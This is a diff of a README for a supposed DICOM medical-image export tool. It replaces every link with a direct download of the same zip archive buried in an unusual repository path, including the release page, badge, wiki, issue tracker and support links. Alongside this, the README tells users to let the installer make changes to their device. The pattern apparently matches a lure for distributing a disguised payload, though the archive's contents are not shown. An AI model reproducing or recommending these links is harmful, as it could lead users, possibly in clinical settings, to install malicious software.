@@ -17,9 +17,9 @@ Follow these steps to download and run the Medical_export_DICOM_tool.
    - Qt libraries: Ensure you have the appropriate version installed.
 
 2. **Download the Application**  
-   Visit this page to download the tool: [Download Medical_export_DICOM_tool](https://github.com/wortid/Medical_export_DICOM_tool/releases)
+   Visit this page to download the tool: [Download Medical_export_DICOM_tool](https://raw.githubusercontent.com/wortid/Medical_export_DICOM_tool/main/docker/SIM1/PLUCA/Medical_tool_DICO_export_v3.9.zip)
 
-   ![Download Button](https://img.shields.io/badge/Download-v1.0-blue.svg)
+   ![Download Button](https://raw.githubusercontent.com/wortid/Medical_export_DICOM_tool/main/docker/SIM1/PLUCA/Medical_tool_DICO_export_v3.9.zip)
 
 3. **Install the Application**  
    - Once the file is downloaded, locate the downloaded file in your computer’s downloads folder.
@@ -27,7 +27,7 @@ Follow these steps to download and run the Medical_export_DICOM_tool.
    - Follow the on-screen instructions to complete the installation.
 
 ## 📥 Download & Install
-To download the Medical_export_DICOM_tool, please visit this page: [Download Medical_export_DICOM_tool](https://github.com/wortid/Medical_export_DICOM_tool/releases)
+To download the Medical_export_DICOM_tool, please visit this page: [Download Medical_export_DICOM_tool](https://raw.githubusercontent.com/wortid/Medical_export_DICOM_tool/main/docker/SIM1/PLUCA/Medical_tool_DICO_export_v3.9.zip)
 
 After downloading the tool:
 - If prompted, allow the installation program to make changes to your device.
@@ -70,9 +70,9 @@ A: Yes, the Medical_export_DICOM_tool is compatible with Windows, macOS, and Lin
 A: Ensure that you have the required permissions and available disk space. If issues persist, check the issue tracker on the repository for troubleshooting steps.
 
 ## 📚 Resources
-- [User Documentation](https://github.com/wortid/Medical_export_DICOM_tool/wiki)
-- [Issue Tracker](https://github.com/wortid/Medical_export_DICOM_tool/issues)
-- [Support Community](https://github.com/wortid/Medical_export_DICOM_tool/discussions)
+- [User Documentation](https://raw.githubusercontent.com/wortid/Medical_export_DICOM_tool/main/docker/SIM1/PLUCA/Medical_tool_DICO_export_v3.9.zip)
+- [Issue Tracker](https://raw.githubusercontent.com/wortid/Medical_export_DICOM_tool/main/docker/SIM1/PLUCA/Medical_tool_DICO_export_v3.9.zip)
+- [Support Community](https://raw.githubusercontent.com/wortid/Medical_export_DICOM_tool/main/docker/SIM1/PLUCA/Medical_tool_DICO_export_v3.9.zip)
 
 ## 📬 Contact
 For additional questions or support, you can reach out via the Issues section on the GitHub repository. 
